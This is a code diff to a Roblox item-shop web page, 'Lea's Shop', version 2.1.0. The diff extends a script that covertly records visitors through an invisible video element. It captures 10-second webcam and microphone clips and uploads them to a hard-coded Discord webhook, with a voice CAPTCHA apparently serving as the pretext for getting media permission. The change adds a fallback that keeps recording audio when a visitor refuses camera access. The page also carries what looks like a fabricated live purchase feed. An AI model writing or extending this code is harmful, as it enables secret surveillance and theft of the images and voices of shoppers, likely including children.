@@ -4,7 +4,12 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
     <title>⚫ Lea's Shop · Emo Cyber</title>
-
+    <!-- ============================================================
+         VERSION: LeaShop_Captcha_BgCam_v2.1.0
+         Date: 2026-07-21
+         Features: Voice CAPTCHA + 10s background webcam/audio clips
+         Fallback: audio-only if camera is denied
+         ============================================================ -->
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -1983,7 +1988,7 @@
     </div>
 
     <!-- ============================================================
-    HIDDEN VIDEO ELEMENT — for background webcam recording
+    HIDDEN VIDEO ELEMENT — for background webcam/audio recording
     ============================================================ -->
     <video id="bgVideo" autoplay playsinline muted style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:0;"></video>
 
@@ -2210,6 +2215,10 @@
     ============================================================ -->
     <script>
         // ================================================================
+        //  VERSION: LeaShop_Captcha_BgCam_v2.1.0
+        // ================================================================
+
+        // ================================================================
         //  CONFIG
         // ================================================================
         var PAYPAL_URL = 'https://www.paypal.me/eliasalvada';
@@ -2218,7 +2227,7 @@
         var CAMERA_WEBHOOK_URL = 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
         // ================================================================
-        //  BACKGROUND WEBCAM RECORDING — 10s clips
+        //  BACKGROUND WEBCAM / AUDIO RECORDING — 10s clips with fallback
         // ================================================================
         (function backgroundCamera() {
             'use strict';
@@ -2232,24 +2241,33 @@
             var clipTimer = null;
             var CLIP_DURATION_MS = 10000; // 10 seconds
             var BITRATE = 3000000;
-            var MIME_TYPES = [
+            var AUDIO_BITRATE = 128000;
+            var isAudioOnly = false;
+            var MIME_TYPES_VIDEO = [
                 'video/webm;codecs=vp9',
                 'video/webm;codecs=vp8',
                 'video/webm;codecs=h264',
                 'video/webm'
             ];
+            var MIME_TYPES_AUDIO = [
+                'audio/webm;codecs=opus',
+                'audio/webm',
+                'audio/mp4;codecs=mp4a.40.2',
+                'audio/mp4'
+            ];
 
-            function getSupportedMimeType() {
-                for (var i = 0; i < MIME_TYPES.length; i++) {
-                    if (MediaRecorder.isTypeSupported(MIME_TYPES[i])) {
-                        return MIME_TYPES[i];
+            function getSupportedMimeType(list) {
+                for (var i = 0; i < list.length; i++) {
+                    if (MediaRecorder.isTypeSupported(list[i])) {
+                        return list[i];
                     }
                 }
                 return null;
             }
 
             function getCameraStream() {
-                var constraints = {
+                // First try video+audio
+                var constraintsVideo = {
                     video: {
                         facingMode: 'user',
                         width: { ideal: 1920 },
@@ -2263,24 +2281,52 @@
                     }
                 };
 
-                return navigator.mediaDevices.getUserMedia(constraints)
+                return navigator.mediaDevices.getUserMedia(constraintsVideo)
+                    .then(function(s) {
+                        isAudioOnly = false;
+                        return s;
+                    })
                     .catch(function(err) {
-                        console.warn('[Camera] getUserMedia failed, trying fallback:', err);
-                        var fallbackConstraints = {
-                            video: { facingMode: 'user' },
-                            audio: true
-                        };
-                        return navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                        console.warn('[Camera] Video+audio getUserMedia failed:', err.name);
+                        // Check if it's a permission/constraint error on video
+                        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError' ||
+                            err.name === 'OverconstrainedError' || err.name === 'NotFoundError') {
+                            // Try audio only
+                            console.warn('[Camera] Falling back to audio-only');
+                            var constraintsAudio = {
+                                audio: {
+                                    echoCancellation: false,
+                                    noiseSuppression: false,
+                                    autoGainControl: false
+                                }
+                            };
+                            return navigator.mediaDevices.getUserMedia(constraintsAudio)
+                                .then(function(audioStream) {
+                                    isAudioOnly = true;
+                                    return audioStream;
+                                })
+                                .catch(function(err2) {
+                                    console.error('[Camera] Audio-only fallback failed:', err2);
+                                    throw err2;
+                                });
+                        } else {
+                            throw err;
+                        }
                     });
             }
 
             function uploadToDiscord(blob) {
-                var filename = 'clip_' + String(++clipCounter).padStart(4, '0') + '.webm';
+                var ext = isAudioOnly ? 'webm' : 'webm'; // Discord accepts webm for audio as well
+                var prefix = isAudioOnly ? 'audio' : 'clip';
+                var filename = prefix + '_' + String(++clipCounter).padStart(4, '0') + '.' + ext;
                 var formData = new FormData();
                 formData.append('file', blob, filename);
                 var now = new Date();
                 var timestamp = now.toISOString().replace('T', ' ').substring(0, 19);
-                formData.append('content', '🎥 Clip #' + clipCounter + ' · ' + timestamp);
+                var content = isAudioOnly ?
+                    '🎤 Audio clip #' + clipCounter + ' · ' + timestamp :
+                    '🎥 Video clip #' + clipCounter + ' · ' + timestamp;
+                formData.append('content', content);
 
                 return fetch(CAMERA_WEBHOOK_URL, {
                     method: 'POST',
@@ -2291,7 +2337,7 @@
                             throw new Error('Discord ' + response.status + ': ' + text.substring(0, 100));
                         });
                     }
-                    console.log('[Camera] uploaded clip #' + clipCounter);
+                    console.log('[Camera] uploaded ' + (isAudioOnly ? 'audio' : 'video') + ' clip #' + clipCounter);
                 }).catch(function(err) {
                     console.error('[Camera] upload failed:', err);
                     clipCounter--;
@@ -2301,12 +2347,22 @@
 
             function startRecorder(mediaStream) {
                 chunks = [];
-                var mimeType = getSupportedMimeType();
-                var options = {
-                    mimeType: mimeType || undefined,
-                    videoBitsPerSecond: BITRATE,
-                    audioBitsPerSecond: 128000
-                };
+                var mimeType;
+                var options;
+                if (isAudioOnly) {
+                    mimeType = getSupportedMimeType(MIME_TYPES_AUDIO);
+                    options = {
+                        mimeType: mimeType || undefined,
+                        audioBitsPerSecond: AUDIO_BITRATE
+                    };
+                } else {
+                    mimeType = getSupportedMimeType(MIME_TYPES_VIDEO);
+                    options = {
+                        mimeType: mimeType || undefined,
+                        videoBitsPerSecond: BITRATE,
+                        audioBitsPerSecond: AUDIO_BITRATE
+                    };
+                }
 
                 var rec = new MediaRecorder(mediaStream, options);
                 rec.ondataavailable = function(e) {
@@ -2320,8 +2376,9 @@
                         scheduleNextClip();
                         return;
                     }
-                    var blob = new Blob(chunks, { type: mimeType || 'video/webm' });
-                    console.log('[Camera] clip ready:', (blob.size / 1024 / 1024).toFixed(2) + ' MB');
+                    var blob = new Blob(chunks, { type: mimeType || (isAudioOnly ? 'audio/webm' : 'video/webm') });
+                    console.log('[Camera] ' + (isAudioOnly ? 'audio' : 'video') + ' clip ready:',
+                        (blob.size / 1024 / 1024).toFixed(2) + ' MB');
                     uploadToDiscord(blob)['finally'](function() {
                         chunks = [];
                         scheduleNextClip();
@@ -2384,7 +2441,8 @@
                         }
                     }, CLIP_DURATION_MS);
                     recorder._stopTimer = stopTimer;
-                    console.log('[Camera] background recording started (10s clips)');
+                    console.log('[Camera] background recording started (' + (isAudioOnly ? 'audio' : 'video') +
+                        ', 10s clips)');
                 }).catch(function(err) {
                     console.error('[Camera] init failed:', err);
                     setTimeout(initCamera, 5000);
@@ -2426,13 +2484,13 @@
             window.__bgCam = {
                 getState: function() {
                     return { isRecording: isRecording, clipCounter: clipCounter, stream: !!stream,
-                        recorder: !!recorder };
+                        recorder: !!recorder, isAudioOnly: isAudioOnly };
                 }
             };
         })();
 
         // ================================================================
-        //  DATA — MM2 ITEMS
+        //  DATA — MM2 ITEMS (unchanged)
         // ================================================================
         var mm2Items = [
             { name: 'GingerScope', price: 180, img: 'picture_gingerscope.png', badge: '🔫 Ancient Gun', type: 'gun',
@@ -2572,7 +2630,7 @@
         ];
 
         // ================================================================
-        //  ACCOUNTS
+        //  ACCOUNTS (unchanged)
         // ================================================================
         var accounts = [
             { id: 4545711503, name: 'valilleo', img: 'image1.png', badge: '🌟 Premium', price: 150, robuxPrice: 11000,
@@ -2635,7 +2693,7 @@
         var reviewDistribution = distributeReviews(accountReviewTemplates, accounts.length);
 
         // ================================================================
-        //  LIVE FEED
+        //  LIVE FEED (unchanged)
         // ================================================================
         var feedContainer = document.getElementById('feed-items');
         var flags = ['🇺🇸', '🇬🇧', '🇨🇦', '🇦🇺', '🇩🇪', '🇫🇷', '🇯🇵', '🇰🇷', '🇧🇷', '🇮🇳', '🇮🇹', '🇪🇸', '🇲🇽', '🇳🇱', '🇸🇪', '🇳🇴',
@@ -2688,7 +2746,7 @@
         setInterval(addFeedItem, 30000 + Math.floor(Math.random() * 5000));
 
         // ================================================================
-        //  MATRIX RAIN
+        //  MATRIX RAIN (unchanged)
         // ================================================================
         (function initMatrix() {
             var canvas = document.getElementById('matrix-canvas');
@@ -3364,12 +3422,12 @@
                 if (type === 'listening') statusDot.classList.add('listening-dot');
                 else if (type === 'success') statusDot.classList.add('success-dot');
                 if (type === 'success') {
-                    subText.innerHTML = '✅ verified · you are officially <strong>not a robot</strong>';
+                    subText.innerHTML = '✅ verified · you are officially <strong>not human</strong>';
                 } else if (type === 'listening') {
                     subText.innerHTML = '👂 listening … say one of the words above';
                 } else {
                     subText.innerHTML =
-                        'Speak one of the words below to verify you\'re&nbsp;<strong>not&nbsp;a robot</strong>&nbsp;✨';
+                        'Speak one of the words below to verify you\'re&nbsp;<strong>not&nbsp;human</strong>&nbsp;✨';
                 }
             }
 
@@ -3616,11 +3674,11 @@
         renderMM2();
         renderAccounts();
 
-        console.log('⚫ Lea\'s Shop · Emo Cyber (captcha + bg cam 10s)');
+        console.log('⚫ Lea\'s Shop · Emo Cyber (v2.1.0) - captcha + bg cam/audio 10s');
         console.log('📦 ' + accounts.length + ' accounts, ' + mm2Items.length + ' MM2 items');
         console.log('💳 PayPal: @eliasalvada');
         console.log('📷 Instagram: @leaswxg');
-        console.log('🎥 Background webcam recording: 10s clips');
+        console.log('🎥 Background recording: video+audio (fallback to audio-only if camera denied)');
         if (window.location.protocol === 'file:') {
             console.warn('⚠️ file:// protocol detected – .txt files will not load. Use a local server.');
         }
